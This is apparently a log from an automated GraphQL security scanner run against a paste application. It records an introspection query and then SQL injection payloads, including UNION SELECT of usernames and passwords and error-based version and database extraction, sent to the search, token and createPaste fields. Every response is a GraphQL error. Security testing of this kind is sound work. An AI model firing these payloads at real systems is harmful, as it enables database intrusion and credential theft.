2026-02-03 20:06:25,455 | INFO    | GraphQLClient        | -                              | introspection        | POST | success  |  0.514s | payload=[__schema] response=[{"data": {"__schema": {"queryType": {"name": "Query", "fields": [{"name": "pastes", "args": [{"name": "public", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}, {"name": "limit", "type"…]
2026-02-03 20:06:26,155 | INFO    | InjectionTester      | admin_comment_star             | search.keyword       | POST | success  |  0.002s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 39}]}, {…]
2026-02-03 20:06:26,157 | INFO    | InjectionTester      | union_select_123               | search.keyword       | POST | success  |  0.002s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 54}]}, {…]
2026-02-03 20:06:26,160 | INFO    | InjectionTester      | union_select_users             | search.keyword       | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 86}]}, {…]
2026-02-03 20:06:26,163 | INFO    | InjectionTester      | error_based_version            | search.keyword       | POST | success  |  0.002s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 152}]}, …]
2026-02-03 20:06:26,166 | INFO    | InjectionTester      | error_based_extractvalue       | search.keyword       | POST | success  |  0.002s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 96}]}, {…]
2026-02-03 20:06:26,169 | INFO    | InjectionTester      | boolean_true                   | search.keyword       | POST | success  |  0.002s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 43}]}, {…]
2026-02-03 20:06:26,172 | INFO    | InjectionTester      | boolean_false                  | search.keyword       | POST | success  |  0.002s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 43}]}, {…]
2026-02-03 20:06:26,175 | INFO    | InjectionTester      | single_quote                   | me.token             | POST | success  |  0.003s | payload=['] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 29}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,178 | INFO    | InjectionTester      | or_1_eq_1_dash                 | me.token             | POST | success  |  0.003s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 39}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,181 | INFO    | InjectionTester      | or_string_eq                   | me.token             | POST | success  |  0.003s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 39}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,183 | INFO    | InjectionTester      | double_quote_or                | me.token             | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:25) Expected :, found String\n\n1: query { me(token: \"\" OR \"\"=\"\") { id message error success } }\n                           ^\n", "locations": […]
2026-02-03 20:06:26,185 | INFO    | InjectionTester      | double_quote_1_eq_1            | me.token             | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:25) Expected :, found Int \"1\"\n\n1: query { me(token: \"\" OR 1=1 --\") { id message error success } }\n                           ^\n", "locations":…]
2026-02-03 20:06:26,189 | INFO    | InjectionTester      | or_1_eq_1_hash                 | me.token             | POST | success  |  0.003s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 38}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,192 | INFO    | InjectionTester      | admin_comment_dash             | me.token             | POST | success  |  0.003s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 37}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,196 | INFO    | InjectionTester      | admin_comment_hash             | me.token             | POST | success  |  0.003s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 36}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,199 | INFO    | InjectionTester      | admin_comment_star             | me.token             | POST | success  |  0.003s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 36}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,202 | INFO    | InjectionTester      | union_select_123               | me.token             | POST | success  |  0.003s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 51}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,205 | INFO    | InjectionTester      | union_select_users             | me.token             | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 83}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,208 | INFO    | InjectionTester      | error_based_version            | me.token             | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 149}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locat…]
2026-02-03 20:06:26,211 | INFO    | InjectionTester      | error_based_extractvalue       | me.token             | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 93}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,214 | INFO    | InjectionTester      | boolean_true                   | me.token             | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 40}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,217 | INFO    | InjectionTester      | boolean_false                  | me.token             | POST | success  |  0.003s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 40}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:26,221 | INFO    | InjectionTester      | single_quote                   | createPaste.content  | POST | success  |  0.003s | payload=['] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 81}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:26,224 | INFO    | InjectionTester      | or_1_eq_1_dash                 | createPaste.content  | POST | success  |  0.003s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 91}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:26,228 | INFO    | InjectionTester      | or_string_eq                   | createPaste.content  | POST | success  |  0.003s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 91}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:26,230 | INFO    | InjectionTester      | double_quote_or                | createPaste.content  | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:51) Expected :, found String\n\n1: mutation { createPaste(burn: true, content: \"\" OR \"\"=\"\", public: true, title: \"test\") { id content title suc…]
2026-02-03 20:06:26,233 | INFO    | InjectionTester      | double_quote_1_eq_1            | createPaste.content  | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:51) Expected :, found Int \"1\"\n\n1: mutation { createPaste(burn: true, content: \"\" OR 1=1 --\", public: true, title: \"test\") { id content title s…]
2026-02-03 20:06:26,237 | INFO    | InjectionTester      | or_1_eq_1_hash                 | createPaste.content  | POST | success  |  0.004s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 90}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:26,241 | INFO    | InjectionTester      | admin_comment_dash             | createPaste.content  | POST | success  |  0.003s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 89}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:26,244 | INFO    | InjectionTester      | admin_comment_hash             | createPaste.content  | POST | success  |  0.003s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 88}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:26,247 | INFO    | InjectionTester      | admin_comment_star             | createPaste.content  | POST | success  |  0.003s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 88}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:26,251 | INFO    | InjectionTester      | union_select_123               | createPaste.content  | POST | success  |  0.003s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 103}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:06:26,254 | INFO    | InjectionTester      | union_select_users             | createPaste.content  | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 135}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:06:26,258 | INFO    | InjectionTester      | error_based_version            | createPaste.content  | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 201}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:06:26,261 | INFO    | InjectionTester      | error_based_extractvalue       | createPaste.content  | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 145}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:06:26,264 | INFO    | InjectionTester      | boolean_true                   | createPaste.content  | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 92}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
